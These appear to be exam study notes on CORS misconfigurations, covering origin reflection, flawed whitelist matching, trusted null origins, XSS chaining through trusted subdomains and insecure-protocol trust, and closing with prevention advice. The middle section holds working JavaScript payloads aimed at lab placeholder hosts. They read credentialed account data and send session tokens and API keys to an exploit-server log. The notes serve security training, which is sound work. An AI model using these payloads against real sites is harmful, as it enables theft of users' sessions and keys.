# CORS

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).

## Same-origin policy

The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. It generally allows a domain to issue requests to other domains, but not to access the responses.

## Relaxation of the same-origin policy

The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints. Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).

The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted. These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.

## Vulnerabilities arising from CORS configuration issues

{% code overflow="wrap" fullWidth="true" %}
```sh
https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#cors

# CORS vulnerability with basic origin reflection
Insecure CORS configuration in that it trusts all origins
Identify in the source code the account details are requested with AJAX request and it contains the user session cookie in the response.
- If response contains Access-Control-Allow-Credentials header, it may support CORS
- Send request with header Origin: https://example.com, see is reflected on response Access-Control-Allow-Origin: 
    Place code in the exploit server body and Deliver exploit to victim to steal the AJAX session token and API key. 
In the BSCP exam use the CORS vulnerability to steal JSON data that also include the administrator session token, 
and can be used to escalate privilege.
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
Deliver the exploit to the victim and access log to find Administrator API key.


# Server-generated ACAO header from client-specified Origin header
# Request
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
# Response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
# These headers state that access is allowed from the requesting domain, any domain can access the vulnerable resource


# Errors parsing Origin headers
Some applications that support access from multiple origins do so by using a whitelist of allowed origins.
When a CORS request is received, the supplied origin is compared to the whitelist. 
If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header, access granted.
# For example, suppose an application grants access to all domains ending in:
*normal-website.com
# An attacker might be able to gain access by registering the domain:
hackersnormal-website.com
# Alternatively, suppose an application grants access to all domains beginning with
normal-website.com*
# An attacker might be able to gain access using the domain:
normal-website.com.evil-user.net


# Whitelisted null origin value
Origin header supports the value null. Browsers might send that value in various unusual situations:
    Cross-origin redirects.
    Requests from serialized data.
    Request using the file: protocol.
    Sandboxed cross-origin requests.


# CORS vulnerability with trusted null origin
- AJAX request, see response contains Access-Control-Allow-Credentials
- Add header Origin:null, send request and see Access-Control-Allow-Origin: null on response
- Craft exploit body
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>


# Exploiting XSS via CORS trust relationships
Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin 
that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject 
some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
# Given the following request:
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
# If the server responds with:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
# Then an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could use that to retrieve the API key, using a URL like:
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>


# Breaking TLS with poorly configured CORS (Trusted insecure protocols)
#  Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. 
# For example, when the application receives the following request:
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
# The application responds with:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
- AJAX request, see response contains Access-Control-Allow-Credentials
- Add header Origin: Origin: http://subdomain.lab-id, send request and see Access-Control-Allow-Origin: on response
- Craft exploit body
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>


# Intranets and CORS without credentials
#  Most CORS attacks rely on the presence of the response header:
Access-Control-Allow-Credentials: true
Without that header, the victim user browser will refuse to send their cookies, meaning the attacker will only gain access
to unauthenticated content, which they could just as easily access by browsing directly to the target website. 
# However, there is one common situation where an attacker can't access a website directly: when it's part of an intranet
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
#  And the server responds with:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```
{% endcode %}

## How to prevent CORS-based attacks

Proper configuration of cross-origin requests\
If a web contains sensitive info, the origin should be properly specified in the Access-Control-Allow-Origin header.\
Only allow trusted sites\
Origins specified in the Access-Control-Allow-Origin header should only be sites that are trusted\
Avoid whitelisting null\
Avoid using the header Access-Control-Allow-Origin: null.\
Avoid wildcards in internal networks\
Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.\
CORS is not a substitute for server-side security policies\
Web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.
